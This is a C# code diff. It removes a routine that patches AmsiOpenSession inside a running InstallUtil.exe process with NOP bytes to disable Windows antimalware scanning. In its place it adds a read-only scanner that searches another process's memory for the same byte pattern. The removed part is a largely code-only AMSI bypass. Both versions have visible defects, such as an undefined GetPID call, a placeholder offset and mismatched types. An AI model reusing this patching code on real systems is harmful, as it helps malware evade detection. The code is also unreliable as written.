@@ -1,104 +1,105 @@
-[DllImport("psapi.dll", SetLastError = true)]
-public static extern bool EnumProcessModulesEx(IntPtr hProcess, [Out] IntPtr[] lphModule, uint cb, out uint lpcbNeeded, uint dwFilterFlag);
-[DllImport("psapi.dll", SetLastError = true, CharSet = CharSet.Auto)]
-public static extern uint GetModuleBaseName(IntPtr hProcess, IntPtr hModule, [Out] char[] lpBaseName, uint nSize);
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
 
-[DllImport("kernel32.dll", SetLastError = true)]
-public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out uint lpNumberOfBytesRead);
-
-[DllImport("kernel32.dll", SetLastError = true)]
-public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
-
-
-
-private static void PatchA()
+[StructLayout(LayoutKind.Sequential)]
+public struct MEMORY_BASIC_INFORMATION
 {
-    byte[] pattern = { 0x48, 0x00, 0x00, 0x74, 0x00, 0x48, 0x00, 0x00, 0x74 };
-    uint patternSize = (uint)pattern.Length;
-
-    uint tpid = GetPID(); // Get the PID from the user
-    if (tpid == 0)
-    {
-        Console.WriteLine("InstallUtil.exe process not found.");
-        return;
-    }
-
-    Console.WriteLine("Process PID: " + tpid);
-
-    IntPtr processHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, tpid);
-    if (processHandle == IntPtr.Zero)
-    {
-        Console.WriteLine("Failed to open process. Error: " + Marshal.GetLastWin32Error());
-        return;
-    }
-
-    // Find the base address of amsi.dll in the target process
-    IntPtr amsiBaseAddr = GetModuleHandleRemote(processHandle, "amsi.dll");
-    if (amsiBaseAddr == IntPtr.Zero)
-    {
-        Console.WriteLine("Failed to find amsi.dll in the target process.");
-        return;
-    }
-
-    // Calculate the address of AmsiOpenSession in the target process
-    IntPtr amsiOpenSessionAddr = IntPtr.Add(amsiBaseAddr, GetAmsiOpenSessionOffset());
-
-    Console.WriteLine("AmsiOpenSession address: 0x" + amsiOpenSessionAddr.ToString("X"));
-
-    // Reading memory from the target process
-    byte[] buffer = new byte[1024];
-    uint bytesRead;
-    if (!ReadProcessMemory(processHandle, amsiOpenSessionAddr, buffer, buffer.Length, out bytesRead))
-    {
-        Console.WriteLine("Failed to read process memory. Error: " + Marshal.GetLastWin32Error());
-        return;
-    }
-
-    // Patch the memory (example patch)
-    ulong matchAddress = SearchPattern(buffer, bytesRead, pattern, patternSize);
-    ulong updateAmsiAddress = (ulong)amsiOpenSessionAddr.ToInt64() + matchAddress;
-
-    uint bytesWritten;
-    byte[] patch = { 0x90, 0x90, 0x90 }; // Example NOP patch
-    if (!WriteProcessMemory(processHandle, (IntPtr)updateAmsiAddress, patch, patch.Length, out bytesWritten))
-    {
-        Console.WriteLine("Failed to write process memory. Error: " + Marshal.GetLastWin32Error());
-        return;
-    }
-
-    Console.WriteLine("Memory patch successful.");
+    public IntPtr BaseAddress;
+    public IntPtr AllocationBase;
+    public uint AllocationProtect;
+    public IntPtr RegionSize;
+    public uint State;
+    public uint Protect;
+    public uint Type;
 }
 
-// Find the base address of the module in the target process
-private static IntPtr GetModuleHandleRemote(IntPtr processHandle, string moduleName)
+class Program
 {
-    IntPtr[] modules = new IntPtr[1024];
-    uint cb = (uint)(IntPtr.Size * modules.Length);
-    uint cbNeeded;
+    // Import necessary functions
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
-    if (EnumProcessModulesEx(processHandle, modules, cb, out cbNeeded, 0x03)) // LIST_MODULES_ALL
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out uint lpNumberOfBytesRead);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);
+
+    const uint PROCESS_VM_READ = 0x0010;
+    const uint PROCESS_QUERY_INFORMATION = 0x0400;
+
+    static void Main(string[] args)
     {
-        int moduleCount = (int)(cbNeeded / IntPtr.Size);
+        int targetPid = 1234; // Example target process ID (replace with actual)
+        byte[] pattern = { 0x48, 0x00, 0x00, 0x74, 0x00, 0x48, 0x00, 0x00, 0x74 };
+        uint patternSize = (uint)pattern.Length;
 
-        for (int i = 0; i < moduleCount; i++)
+        IntPtr processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, targetPid);
+        if (processHandle == IntPtr.Zero)
         {
-            char[] moduleNameBuffer = new char[255];
-            GetModuleBaseName(processHandle, modules[i], moduleNameBuffer, (uint)moduleNameBuffer.Length);
-            string currentModuleName = new string(moduleNameBuffer).TrimEnd('\0');
+            Console.WriteLine("Failed to open process. Error: " + Marshal.GetLastWin32Error());
+            return;
+        }
 
-            if (string.Equals(currentModuleName, moduleName, StringComparison.OrdinalIgnoreCase))
+        // Read the process memory
+        ReadProcessMemoryAndSearch(processHandle, pattern, patternSize);
+    }
+
+    static void ReadProcessMemoryAndSearch(IntPtr processHandle, byte[] pattern, uint patternSize)
+    {
+        IntPtr currentAddress = IntPtr.Zero;
+        MEMORY_BASIC_INFORMATION memInfo = new MEMORY_BASIC_INFORMATION();
+        uint mbiSize = (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));
+
+        // Iterate through the process memory regions
+        while (VirtualQueryEx(processHandle, currentAddress, out memInfo, mbiSize) != 0)
+        {
+            // Check if the region is committed and readable
+            if (memInfo.State == 0x1000 /* MEM_COMMIT */ && (memInfo.Protect & 0xF0) != 0)
             {
-                return modules[i]; // Return the base address of the module in the target process
+                byte[] buffer = new byte[(int)memInfo.RegionSize];
+
+                // Try to read the memory region
+                if (ReadProcessMemory(processHandle, memInfo.BaseAddress, buffer, (uint)buffer.Length, out uint bytesRead))
+                {
+                    Console.WriteLine($"Reading memory at: 0x{memInfo.BaseAddress.ToString("X")} - Size: {memInfo.RegionSize}");
+
+                    // Search for the pattern in the memory region
+                    if (SearchPattern(buffer, bytesRead, pattern, patternSize))
+                    {
+                        Console.WriteLine($"Pattern found at: 0x{memInfo.BaseAddress.ToString("X")}");
+                    }
+                }
+                else
+                {
+                    Console.WriteLine($"Failed to read memory at: 0x{memInfo.BaseAddress.ToString("X")}. Error: " + Marshal.GetLastWin32Error());
+                }
             }
+
+            // Move to the next memory region
+            currentAddress = IntPtr.Add(memInfo.BaseAddress, (int)memInfo.RegionSize);
         }
     }
 
-    return IntPtr.Zero; // Module not found
-}
+    static bool SearchPattern(byte[] buffer, uint bytesRead, byte[] pattern, uint patternSize)
+    {
+        for (int i = 0; i <= bytesRead - patternSize; i++)
+        {
+            bool found = true;
+            for (int j = 0; j < patternSize; j++)
+            {
+                if (buffer[i + j] != pattern[j])
+                {
+                    found = false;
+                    break;
+                }
+            }
 
-// Get the offset of AmsiOpenSession (you'll need to find this offset, typically using a disassembler)
-private static int GetAmsiOpenSessionOffset()
-{
-    // Example offset - adjust this to the correct offset
-    return 0x1000;
+            if (found)
+                return true;
+        }
+
+        return false;
+    }
 }
